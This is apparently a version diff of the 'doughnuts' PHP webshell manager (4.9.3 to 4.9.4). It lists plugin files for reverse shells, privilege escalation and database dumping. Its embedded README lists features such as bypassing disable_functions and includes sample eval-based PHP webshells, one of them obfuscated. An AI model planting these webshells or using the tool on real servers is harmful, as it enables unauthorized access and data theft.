+-rw-r--r--   0        0        0     1432 2020-10-15 09:06:53.420369 doughnuts-4.9.4/doughnuts/webshell_plugins/fc.py
+-rw-r--r--   0        0        0     1345 2020-10-15 09:06:53.420369 doughnuts-4.9.4/doughnuts/webshell_plugins/fl.py
+-rw-r--r--   0        0        0     1324 2020-10-15 09:06:53.420369 doughnuts-4.9.4/doughnuts/webshell_plugins/fwpf.py
+-rw-r--r--   0        0        0      616 2020-10-15 09:06:53.421367 doughnuts-4.9.4/doughnuts/webshell_plugins/getenv.py
+-rw-r--r--   0        0        0      219 2020-10-15 09:06:53.421367 doughnuts-4.9.4/doughnuts/webshell_plugins/info.py
+-rw-r--r--   0        0        0     3957 2020-10-22 10:53:01.212957 doughnuts-4.9.4/doughnuts/webshell_plugins/ls.py
+-rw-r--r--   0        0        0     4119 2021-04-04 06:44:17.165177 doughnuts-4.9.4/doughnuts/webshell_plugins/mdownload.py
+-rw-r--r--   0        0        0      777 2021-04-01 01:18:19.497549 doughnuts-4.9.4/doughnuts/webshell_plugins/mkdir.py
+-rw-r--r--   0        0        0      844 2020-10-15 09:06:53.422367 doughnuts-4.9.4/doughnuts/webshell_plugins/move.py
+-rw-r--r--   0        0        0     6286 2021-04-04 06:44:39.586670 doughnuts-4.9.4/doughnuts/webshell_plugins/mupload.py
+-rw-r--r--   0        0        0      496 2020-10-15 09:06:53.423368 doughnuts-4.9.4/doughnuts/webshell_plugins/pdf.py
+-rw-r--r--   0        0        0     4568 2021-04-04 06:44:51.282686 doughnuts-4.9.4/doughnuts/webshell_plugins/portscan.py
+-rw-r--r--   0        0        0     1663 2020-10-15 09:06:53.424368 doughnuts-4.9.4/doughnuts/webshell_plugins/priv.py
+-rw-r--r--   0        0        0     2297 2021-04-04 06:44:58.789604 doughnuts-4.9.4/doughnuts/webshell_plugins/ps.py
+-rw-r--r--   0        0        0      269 2020-10-15 09:06:53.425368 doughnuts-4.9.4/doughnuts/webshell_plugins/pwd.py
+-rw-r--r--   0        0        0      801 2021-04-01 01:18:19.498548 doughnuts-4.9.4/doughnuts/webshell_plugins/remove.py
+-rw-r--r--   0        0        0     3515 2021-04-04 06:45:20.899633 doughnuts-4.9.4/doughnuts/webshell_plugins/remp.py
+-rw-r--r--   0        0        0     2652 2020-11-16 12:09:36.056169 doughnuts-4.9.4/doughnuts/webshell_plugins/reshell.py
+-rw-r--r--   0        0        0    13027 2020-10-15 15:33:57.704832 doughnuts-4.9.4/doughnuts/webshell_plugins/reverse.py
+-rw-r--r--   0        0        0      646 2021-04-01 01:18:19.498548 doughnuts-4.9.4/doughnuts/webshell_plugins/rmdir.py
+-rw-r--r--   0        0        0     1423 2020-10-15 09:06:53.427368 doughnuts-4.9.4/doughnuts/webshell_plugins/search.py
+-rw-r--r--   0        0        0     3155 2020-10-15 09:06:53.427368 doughnuts-4.9.4/doughnuts/webshell_plugins/shell.py
+-rw-r--r--   0        0        0     4756 2020-10-15 09:06:53.428368 doughnuts-4.9.4/doughnuts/webshell_plugins/socks.py
+-rw-r--r--   0        0        0     1211 2020-11-16 04:44:08.375249 doughnuts-4.9.4/doughnuts/webshell_plugins/touch.py
+-rw-r--r--   0        0        0     1698 2021-04-04 06:45:39.996903 doughnuts-4.9.4/doughnuts/webshell_plugins/upload.py
+-rw-r--r--   0        0        0      835 2021-04-06 08:43:46.595031 doughnuts-4.9.4/doughnuts/webshell_plugins/verbose.py
+-rw-r--r--   0        0        0     2535 2020-10-15 09:06:53.429368 doughnuts-4.9.4/doughnuts/webshell_plugins/webshell.py
+-rw-r--r--   0        0        0     1237 2020-10-15 09:06:53.430368 doughnuts-4.9.4/doughnuts/webshell_plugins/write.py
+-rw-r--r--   0        0        0    13239 2021-04-05 12:52:30.930581 doughnuts-4.9.4/doughnuts/webshell_template/gululingbo.py
+-rw-r--r--   0        0        0     1104 2021-04-05 12:52:11.752130 doughnuts-4.9.4/doughnuts/webshell_template/icecream.py
+-rw-r--r--   0        0        0     1553 2021-04-05 12:52:16.590372 doughnuts-4.9.4/doughnuts/webshell_template/popsicle.py
+-rw-r--r--   0        0        0     1651 2021-04-05 12:52:26.803301 doughnuts-4.9.4/doughnuts/webshell_template/pudding.py
+-rw-r--r--   0        0        0     1083 2020-03-17 12:03:16.145472 doughnuts-4.9.4/LICENSE
+-rw-r--r--   0        0        0      572 2021-05-01 08:51:54.095947 doughnuts-4.9.4/pyproject.toml
+-rw-r--r--   0        0        0    22081 2021-05-01 08:51:34.957825 doughnuts-4.9.4/Readme.md
+-rw-r--r--   0        0        0    24217 2021-05-01 08:51:55.812229 doughnuts-4.9.4/setup.py
+-rw-r--r--   0        0        0    22262 2021-05-01 08:51:55.813233 doughnuts-4.9.4/PKG-INFO
```

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/av/av.json` & `doughnuts-4.9.4/doughnuts/auxiliary/av/av.json`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/fpm/fpm.py` & `doughnuts-4.9.4/doughnuts/auxiliary/fpm/fpm.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/ld_preload/ld_preload_x86_64.so` & `doughnuts-4.9.4/doughnuts/auxiliary/ld_preload/ld_preload_x86_64.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/priv/gtfo.json` & `doughnuts-4.9.4/doughnuts/auxiliary/priv/gtfo.json`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/reshell/reverse_server_light.zip` & `doughnuts-4.9.4/doughnuts/auxiliary/reshell/reverse_server_light.zip`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/reshell/reverse_server_x86_64` & `doughnuts-4.9.4/doughnuts/auxiliary/reshell/reverse_server_x86_64`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/mysql/linux/32/lib_mysqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/mysql/linux/32/lib_mysqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/mysql/linux/64/lib_mysqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/mysql/linux/64/lib_mysqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/mysql/windows/32/lib_mysqludf_sys.dll` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/mysql/windows/32/lib_mysqludf_sys.dll`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/mysql/windows/64/lib_mysqludf_sys.dll` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/mysql/windows/64/lib_mysqludf_sys.dll`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/32/8.2/lib_postgresqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/32/8.2/lib_postgresqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/32/8.3/lib_postgresqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/32/8.3/lib_postgresqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/32/8.4/lib_postgresqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/32/8.4/lib_postgresqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/32/9.0/lib_postgresqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/32/9.0/lib_postgresqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/64/8.2/lib_postgresqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/64/8.2/lib_postgresqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/64/8.3/lib_postgresqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/64/8.3/lib_postgresqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/64/8.4/lib_postgresqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/64/8.4/lib_postgresqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/linux/64/9.0/lib_postgresqludf_sys.so` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/linux/64/9.0/lib_postgresqludf_sys.so`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/windows/32/8.2/lib_postgresqludf_sys.dll` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/windows/32/8.2/lib_postgresqludf_sys.dll`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/windows/32/8.3/lib_postgresqludf_sys.dll` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/windows/32/8.3/lib_postgresqludf_sys.dll`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/windows/32/8.4/lib_postgresqludf_sys.dll` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/windows/32/8.4/lib_postgresqludf_sys.dll`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/udf/postgresql/windows/32/9.0/lib_postgresqludf_sys.dll` & `doughnuts-4.9.4/doughnuts/auxiliary/udf/postgresql/windows/32/9.0/lib_postgresqludf_sys.dll`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/auxiliary/user_agents/ua.txt` & `doughnuts-4.9.4/doughnuts/auxiliary/user_agents/ua.txt`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/custom_plugins/Readme.md` & `doughnuts-4.9.4/doughnuts/custom_plugins/Readme.md`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/doughnuts.py` & `doughnuts-4.9.4/doughnuts/doughnuts.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/general/debug.py` & `doughnuts-4.9.4/doughnuts/general/debug.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/general/get.py` & `doughnuts-4.9.4/doughnuts/general/get.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/general/help.py` & `doughnuts-4.9.4/doughnuts/general/help.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/general/log.py` & `doughnuts-4.9.4/doughnuts/general/log.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/general/lsh.py` & `doughnuts-4.9.4/doughnuts/general/lsh.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/general/proxy.py` & `doughnuts-4.9.4/doughnuts/general/proxy.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/general/reload.py` & `doughnuts-4.9.4/doughnuts/general/reload.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/general/save.py` & `doughnuts-4.9.4/doughnuts/general/save.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/helpmenu.py` & `doughnuts-4.9.4/doughnuts/helpmenu.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/install.py` & `doughnuts-4.9.4/doughnuts/install.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/libs/app.py` & `doughnuts-4.9.4/doughnuts/libs/app.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/libs/c64.py` & `doughnuts-4.9.4/doughnuts/libs/c64.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/libs/config.py` & `doughnuts-4.9.4/doughnuts/libs/config.py`

 * *Files 1% similar despite different names*

```diff
@@ -9,15 +9,15 @@
 
 GLOBAL_DICT = {}
 NAMESPACE_CALLBACK_LIST = []
 
 
 def gget(key, namespace: str = "main", default=None) -> Any:
     if (namespace not in GLOBAL_DICT):
-        return None
+        return default
     return GLOBAL_DICT[namespace].get(key, default)
 
 
 def gset(key, value, force=False, namespace: str = "main") -> bool:
     if namespace not in GLOBAL_DICT:
         GLOBAL_DICT[namespace] = {}
     if key not in GLOBAL_DICT or (key in GLOBAL_DICT and force):
```

### Comparing `doughnuts-4.9.3/doughnuts/libs/myapp.py` & `doughnuts-4.9.4/doughnuts/libs/myapp.py`

 * *Files 0% similar despite different names*

```diff
@@ -29,15 +29,15 @@
 SYSTEM_TEMPLATE = None
 Session = requests.Session()
 LOCAL_ENCODING = getpreferredencoding()
 ALPATHNUMERIC = ascii_letters + digits
 RAND_KEY = str(uuid4())
 UNITS = {"B": 1, "KB": 2**10, "MB": 2**20, "GB": 2**30, "TB": 2**40}
 
-__version__ = "4.9.3"
+__version__ = "4.9.4"
 
 
 disable_warnings()
 
 
 def banner():
     logo_choose = randint(1, 3)
```

### Comparing `doughnuts-4.9.3/doughnuts/libs/readline.py` & `doughnuts-4.9.4/doughnuts/libs/readline.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/libs/reverse_client_bash.py` & `doughnuts-4.9.4/doughnuts/libs/reverse_client_bash.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/main_plugins/check.py` & `doughnuts-4.9.4/doughnuts/main_plugins/check.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/main_plugins/connect.py` & `doughnuts-4.9.4/doughnuts/main_plugins/connect.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/main_plugins/generate.py` & `doughnuts-4.9.4/doughnuts/main_plugins/generate.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/main_plugins/load.py` & `doughnuts-4.9.4/doughnuts/main_plugins/load.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/main_plugins/rm.py` & `doughnuts-4.9.4/doughnuts/main_plugins/rm.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/main_plugins/show.py` & `doughnuts-4.9.4/doughnuts/main_plugins/show.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/Myplugin.py` & `doughnuts-4.9.4/doughnuts/Myplugin.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/phpfiles/zip.php` & `doughnuts-4.9.4/doughnuts/phpfiles/zip.php`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/agent.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/agent.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/av.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/av.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/bdf.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/bdf.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/bindshell.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/bindshell.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/bobd.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/bobd.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/cat.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/cat.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/checkvm.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/checkvm.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/chmod.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/chmod.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/copy.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/copy.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/db_dump.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/db_dump.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/db_init.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/db_init.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/db_mdump.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/db_mdump.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/db_shell.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/db_shell.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/db_tables.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/db_tables.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/db_use.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/db_use.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/download.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/download.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/dump.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/dump.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/edit.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/edit.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/execute.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/execute.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/fc.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/fc.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/fl.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/fl.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/fwpf.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/fwpf.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/getenv.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/getenv.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/ls.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/ls.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/mdownload.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/mdownload.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/mkdir.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/mkdir.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/move.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/move.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/mupload.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/mupload.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/portscan.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/portscan.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/priv.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/priv.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/ps.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/ps.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/remove.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/remove.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/remp.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/remp.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/reshell.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/reshell.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/reverse.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/reverse.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/rmdir.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/rmdir.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/search.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/search.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/shell.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/shell.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/socks.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/socks.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/touch.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/touch.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/upload.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/upload.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/verbose.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/verbose.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/webshell.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/webshell.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_plugins/write.py` & `doughnuts-4.9.4/doughnuts/webshell_plugins/write.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_template/gululingbo.py` & `doughnuts-4.9.4/doughnuts/webshell_template/gululingbo.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_template/icecream.py` & `doughnuts-4.9.4/doughnuts/webshell_template/icecream.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_template/popsicle.py` & `doughnuts-4.9.4/doughnuts/webshell_template/popsicle.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/doughnuts/webshell_template/pudding.py` & `doughnuts-4.9.4/doughnuts/webshell_template/pudding.py`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/LICENSE` & `doughnuts-4.9.4/LICENSE`

 * *Files identical despite different names*

### Comparing `doughnuts-4.9.3/pyproject.toml` & `doughnuts-4.9.4/pyproject.toml`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 [tool.poetry]
 name = "doughnuts"
-version = "4.9.3"
+version = "4.9.4"
 description = "A webshell manager for PHP"
 authors = ["WAY29 <toloveu29@gmail.com>"]
 license = "MIT"
 readme = "Readme.md"
 homepage = "https://github.com/way29/doughnuts"
 repository = "https://github.com/way29/doughnuts"
```

### Comparing `doughnuts-4.9.3/Readme.md` & `doughnuts-4.9.4/Readme.md`

 * *Files 1% similar despite different names*

```diff
@@ -259,15 +259,15 @@
 - 4.9.0
     - 修改核心
         - 添加custom_plugins目录,用于存放用户自己编写的插件
         - 添加config.ini文件,用于配置相关参数
 - 4.9.1
     - 修复在pypi版本与github版本不一致的问题
 - 4.9.2
-- 4.9.3
+- 4.9.3, 4.9.4
     - 修复在不存在自定义命令时连接webshell后帮助菜单无法显示的bug
 
 ### 4.8
 - 4.8.0
     - 修改命令
         - generate命令 现在支持在自定义webshell模板,在doughnuts/webshell_plugins下可以添加自己的模板,详情请查看上面的自定义webshell模板
 - 4.8.1
```

### Comparing `doughnuts-4.9.3/setup.py` & `doughnuts-4.9.4/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -31,29 +31,29 @@
                'auxiliary/udf/postgresql/linux/64/8.4/*',
                'auxiliary/udf/postgresql/linux/64/9.0/*',
                'auxiliary/udf/postgresql/windows/32/8.2/*',
                'auxiliary/udf/postgresql/windows/32/8.3/*',
                'auxiliary/udf/postgresql/windows/32/8.4/*',
                'auxiliary/udf/postgresql/windows/32/9.0/*',
                'auxiliary/user_agents/*',
-               'custom_plugins/Readme.md',
+               'custom_plugins/*',
                'phpfiles/*']}
 
 install_requires = \
 ['colorama>=0.4.3,<0.5.0',
  'prettytable>=0.7.2,<0.8.0',
  'pysocks>=1.7.1,<2.0.0',
  'requests>=2.23.0,<3.0.0',
  'tqdm>=4.50.2,<5.0.0']
 
 setup_kwargs = {
     'name': 'doughnuts',
-    'version': '4.9.3',
+    'version': '4.9.4',
     'description': 'A webshell manager for PHP',
-    'long_description': '# Doughnuts\n\n*一个基于Python3.6+的PHPwebshell管理器*\n\n![main1.png](https://i.loli.net/2020/11/15/QhsPHi7DojbMXcu.png)\n\n![info1.png](https://i.loli.net/2020/11/15/rjAd6hO4fQEWXbi.png)\n\n![part1.png](https://i.loli.net/2020/11/15/weaESdmyCxGV3Jr.png)\n\n![part2.png](https://i.loli.net/2020/11/15/pKlViB9qQvjh82F.png)\n\n![part3.png](https://i.loli.net/2020/11/15/P4T3GfyFXcNbkwQ.png)\n\n![part4.png](https://i.loli.net/2020/11/15/HZu3jdNXB4SoWxU.png)\n\n## 使用文档\n\n***终于迎来了新的使用文档！***\n\n详细使用文档请前往[此页面](http://doughnuts.cc/)进行查看。\n\n## 特征\n\n- 支持连接,记录,管理webshell,方便下一次连接\n- 基于eval的连接,支持GET,POST,COOKIE,HEADER四种连接方式\n- **请求与响应伪装**\n- 支持编码payload(已内置base64,str_rot13,hex,doughnuts四种编码,可以通过添加encode文件夹中的py文件进行扩展),以实现连接带有解码的webshell\n- 支持绕过open_basedir\n- 支持多种方式绕过disable_functions\n    - 自动识别\n    - php7-backtrace\n    - php7-gc\n    - php7-json\n    - php7-plDoublyLinkedList\n    - LD_PRELOAD\n    - FFI\n    - COM\n    - imap_open\n- 核心功能\n    - 获取网站,系统,进程信息\n    - 输出disbale_functions\n    - 寻找可写的PHP文件(以树状结构显示)\n    - 寻找配置文件(文件名中包含cfg/config/db/database) 也可以通过修改代码来支持寻找更多的文件(以树状结构显示)\n    - 执行自定义的php代码\n    - 获取一个临时的非完全交互式shell和webshell\n    - 正向/反弹shell\n    - (仅限双方均为*unix)获取完全交互式的反弹shell\n    - 读/写/上传/下载/删除/搜索文件,目录打包\n    - 数据库管理,脱库\n    - 端口扫描\n    - 内网网页文本式浏览代理，可自定义请求方法和数据\n    - 开启socks5服务器\n    - 检测suid文件并给出提权建议 / 检测杀毒软件\n    - 可以支持简易弹meterpreter的shell\n- 易于扩展\n\n## 依赖\n\n- Python3.6+\n- Python-requests\n- Python-pysocks\n- Python-colorama\n- Python-prettytable\n\n## 安装/运行方法\n\n***请在3.2版本之前运行过`python3 -m doughnuts.install`安装的朋友在更新3.2版本之后重新执行此命令!***\n\n- 使用pip安装\n\n```sh\n# 安装\npython3 -m pip install doughnuts --user -i https://pypi.org/simple/\n# (windows)添加一个bat文件到python根目录下\n# (*unix)添加一个可执行文件到/usr/local/bin下\n# 安装启动器,以方便调用\npython3 -m doughnuts.install\n# 运行\ndoughnuts\n# 或\npython3 -m doughnuts\n# enjoy it!\n```\n\n- 通过poetry安装\n\n```sh\npyton3 -m pip install poetry # 或其他方法安装python-poetry\ngit clone https://github.com/WAY29/Doughnuts.git\ncd Doughnuts\n# debian/ubuntu系统需要运行此命令\napt-get install python3-venv\n# 安装\npoetry install\n# 运行\npoetry run python3 Doughnuts/doughnuts.py # 应该对所有系统生效\n# enjoy it!\n```\n\n- 直接安装\n\n```sh\n# 安装PYTHON 3.6+\ngit clone https://github.com/WAY29/Doughnuts.git\ncd Doughnuts/doughnuts\npip3 install -r requirements.txt 或 pip3 install requests pysocks colorma prettytable tqdm\n# (windows)添加一个bat文件到python根目录下\n# (*unix)添加一个可执行文件到/usr/local/bin下\n# 安装启动器,以方便调用\npython3 install.py\n# 运行\ndoughnuts\n# 或\npython3 doughnuts.py\n# enjoy it!\n```\n\n## 使用例子\n\n*由于windows原因，在windows命令行连接下不支持&符号连接参数。\n尽量将额外参数包裹引号进行传递，且逐一拆分。\n好的习惯:"data:a=123" "data:b=456"\n坏的习惯:"data:a=123&b=456" (在windows命令行下会连接失败)*\n\n1. 普通webshell:\n\n    - 最平凡的webshell:\n\n        ```php\n        //test1.php\n        <?php\n        error_reporting(0);\n        eval($_POST[\'2333\']);\n        ?>\n      ```\n      那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:\n      ```\n      connect http://localhost/test1.php POST 2333\n      ```\n      \n    - 带解码的webshell:\n\n        ```php\n        //test2.php\n        <?php\n        error_reporting(0);\n        eval(str_rot13(base64_decode($_REQUEST[\'2333\'])));\n        ?>\n      ```\n    那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:\n      \n      ```\n      connect http://localhost/test2.php POST 2333 rot13 base64\n      ```\n      \n    - 